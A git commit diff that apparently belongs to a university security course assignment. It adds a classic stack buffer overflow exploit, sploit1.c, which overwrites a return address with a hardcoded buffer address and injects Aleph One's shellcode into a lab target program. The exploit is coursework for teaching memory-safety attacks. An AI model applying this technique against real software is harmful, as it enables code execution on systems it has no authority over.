5335bddda86d3239d43e6ce16e32819188f9fc61
Rafael Moreno Ferrer <rmferrer@gmail.com>
2013-04-01 09:38:26 -0600

    Done with sploit1.c, hardcoded buffer start address. Check if this is OK, or if the program needs to find it itself

--- pa/pa1/sploits/sploit1.c
+++ pa/pa1/sploits/sploit1.c
@@ -5,14 +5,38 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target1"
+#define STR_SIZE 300 /* size of exploit string, enough to overrun the 256 buffer in target1.c:foo */ 
 
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  args[0] = TARGET; args[2] = NULL;
   env[0] = NULL;
+
+  long buffAddr, *addrPtr;
+  char exploitStr[STR_SIZE]; /* string containing exploit code */
+  char *ptr;
+  int i;
+
+  buffAddr = 0xBFFFFC08; /* start address of buf in target1.c:foo */
+  
+  /* First fill the exploit string with the address of the buf in foo. 
+     This will ensure that we overwrite the return address with the 
+     start address of our code */
+  addrPtr = (long *) exploitStr; 
+  for (i = 0; i < STR_SIZE; i += 4)
+    *(addrPtr++) = buffAddr;
+  
+  /* Then fill the first bytes of the exploit string with
+     Aleph One's shellcode */
+  ptr = exploitStr;
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  exploitStr[STR_SIZE - 1] = 0; /* null terminate exploit string for safety */
+  args[1] = exploitStr;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
